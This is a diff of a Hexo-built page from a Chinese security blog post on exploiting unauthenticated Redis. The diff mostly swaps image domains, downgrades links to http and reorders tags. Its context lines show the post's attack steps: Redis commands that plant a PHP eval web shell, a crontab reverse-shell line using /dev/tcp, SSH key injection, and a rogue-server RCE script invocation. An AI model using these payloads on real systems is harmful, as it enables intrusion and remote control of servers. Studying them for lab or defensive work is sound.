@@ -15,18 +15,18 @@
 <meta property="og:site_name" content="Laohuan&#39;s Blog">
 <meta property="og:description" content="背景Redis是一个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API，数据库默认监听端口6379,本实验修改端口为3901。">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://cdn.laohuan.art/2020-06-01_21-36-42.png">
-<meta property="og:image" content="http://cdn.laohuan.art/2020-06-01_21-35-33.png">
-<meta property="og:image" content="http://cdn.laohuan.art/2020-06-01_6-11-15.png">
-<meta property="og:image" content="http://cdn.laohuan.art/2020-06-01_09-56-59.png">
-<meta property="og:image" content="http://cdn.laohuan.art/2020-06-01_11-25-25.png">
-<meta property="og:image" content="http://cdn.laohuan.art/2020-06-01_11-20-41.png">
+<meta property="og:image" content="http://qn.laohuan.xin/2020-06-01_21-36-42.png">
+<meta property="og:image" content="http://qn.laohuan.xin/2020-06-01_21-35-33.png">
+<meta property="og:image" content="http://qn.laohuan.xin/2020-06-01_6-11-15.png">
+<meta property="og:image" content="http://qn.laohuan.xin/2020-06-01_09-56-59.png">
+<meta property="og:image" content="http://qn.laohuan.xin/2020-06-01_11-25-25.png">
+<meta property="og:image" content="http://qn.laohuan.xin/2020-06-01_11-20-41.png">
 <meta property="article:published_time" content="2020-06-06T13:20:08.000Z">
-<meta property="article:modified_time" content="2021-04-19T03:46:52.870Z">
+<meta property="article:modified_time" content="2025-01-06T09:35:35.225Z">
 <meta property="article:author" content="Laohuan">
 <meta property="article:tag" content="未授权访问">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://cdn.laohuan.art/2020-06-01_21-36-42.png">
+<meta name="twitter:image" content="http://qn.laohuan.xin/2020-06-01_21-36-42.png">
   
     <link rel="alternative" href="/atom.xml" title="Laohuan&#39;s Blog" type="application/atom+xml">
   
@@ -44,7 +44,7 @@
 
   
 
-<meta name="generator" content="Hexo 4.2.0"></head>
+<meta name="generator" content="Hexo 4.2.1"></head>
 
 <body>
   <div id="container" q-class="show:isCtnShow">
@@ -279,13 +279,13 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">set payload &#96;&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;&#39;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
 
 <p>3.查看shell</p>
-<p><img src="http://cdn.laohuan.art/2020-06-01_21-36-42.png" alt></p>
+<p><img src="http://qn.laohuan.xin/2020-06-01_21-36-42.png" alt></p>
 <p>4.连接shell</p>
-<p><img src="http://cdn.laohuan.art/2020-06-01_21-35-33.png" alt></p>
+<p><img src="http://qn.laohuan.xin/2020-06-01_21-35-33.png" alt></p>
 <h4><span id="写入shell密匙">写入shell密匙</span></h4><p>前提是目标设置允许使用私匙登陆，且redis安装后会有一个普通redis用户，并且redis可以执行shell。若reids使用root用户运行，可将密匙写到root用户的.ssh文件下。</p>
 <p>1.生成密匙</p>
 <p><code>ssh-keygen -t rsa</code></p>
-<p><img src="http://cdn.laohuan.art/2020-06-01_6-11-15.png" alt></p>
+<p><img src="http://qn.laohuan.xin/2020-06-01_6-11-15.png" alt></p>
 <ul>
 <li>ssh_ras为私匙</li>
 <li>ssh_rsa.pub为公匙</li>
@@ -305,20 +305,20 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set shell &quot;\n\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;端口 0&gt;&amp;1\n\n&quot;</span><br><span class="line">config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
 
 <p>3.查看shell</p>
-<p><img src="http://cdn.laohuan.art/2020-06-01_09-56-59.png" alt></p>
+<p><img src="http://qn.laohuan.xin/2020-06-01_09-56-59.png" alt></p>
 <p>反弹shell已经写到计划任务，由于以上原因，无法反弹成功</p>
 <h4><span id="脚本">脚本</span></h4><p>1.基于主从复制RCE</p>
 <ul>
-<li>&lt;<a href="https://github.com/Ridter/redis-rce" target="_blank" rel="noopener">https://github.com/Ridter/redis-rce</a> /&gt;</li>
-<li><a href="https://github.com/n0b0dyCN/redis-rogue-server/" target="_blank" rel="noopener">https://github.com/n0b0dyCN/redis-rogue-server/</a></li>
+<li>&lt;<a href="http://github.com/Ridter/redis-rce" target="_blank" rel="noopener">http://github.com/Ridter/redis-rce</a> /&gt;</li>
+<li><a href="http://github.com/n0b0dyCN/redis-rogue-server/" target="_blank" rel="noopener">http://github.com/n0b0dyCN/redis-rogue-server/</a></li>
 </ul>
 <p><code>python3 redis-rogue-server.py --rhost 目标主机 --rport 目标端口 --lhost 监听IP --lport 端口</code></p>
-<p><img src="http://cdn.laohuan.art/2020-06-01_11-25-25.png" alt></p>
+<p><img src="http://qn.laohuan.xin/2020-06-01_11-25-25.png" alt></p>
 <p>选择1会直接得到一个shell</p>
-<p><img src="http://cdn.laohuan.art/2020-06-01_11-20-41.png" alt></p>
+<p><img src="http://qn.laohuan.xin/2020-06-01_11-20-41.png" alt></p>
 <p>选择2会得到一个反弹shell</p>
 <h4><span id="参考链接">参考链接</span></h4><p>&lt;<a href="http://www.vkxss.top/2019/05/28/渗透测试-Redis未授权访问漏洞之ubuntu反弹shell问题/index.html" target="_blank" rel="noopener">http://www.vkxss.top/2019/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E4%B9%8Bubuntu%E5%8F%8D%E5%BC%B9shell%E9%97%AE%E9%A2%98/index.html</a>/&gt;</p>
-<p><a href="https://siweicn.yuque.com/securitytech/exploit/redis/" target="_blank" rel="noopener">https://siweicn.yuque.com/securitytech/exploit/redis/</a></p>
+<p><a href="http://siweicn.yuque.com/securitytech/exploit/redis/" target="_blank" rel="noopener">http://siweicn.yuque.com/securitytech/exploit/redis/</a></p>
 
       
 
@@ -520,7 +520,7 @@
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2023 Laohuan
+    		&copy; 2025 Laohuan
     	</div>
       	<div class="footer-right">
       		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
@@ -640,6 +640,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">JBoss</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">CGI</a>
               </li>
              
@@ -648,7 +652,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">JBoss</a>
+                <a href="javascript:void(0)" class="js-tag color1">HTTPS</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">应急响应</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">考试</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -656,7 +668,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">权限维持</a>
+                <a href="javascript:void(0)" class="js-tag color5">SSRF</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -668,7 +680,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Samba</a>
+                <a href="javascript:void(0)" class="js-tag color5">权限维持</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -676,7 +688,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Tomcat</a>
+                <a href="javascript:void(0)" class="js-tag color1">Samba</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -684,7 +696,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">Tomcat</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">Weblogic</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">工具分享</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -700,6 +720,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">靶场</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">zabbix</a>
               </li>
              
@@ -708,39 +732,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Chrome</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">靶场</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">内网渗透</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">应急响应</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">工具分享</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">考试</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">SSRF</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">HTTPS</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">加解密</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">Chrome</a>
               </li>
             
             <div class="clearfix"></div>
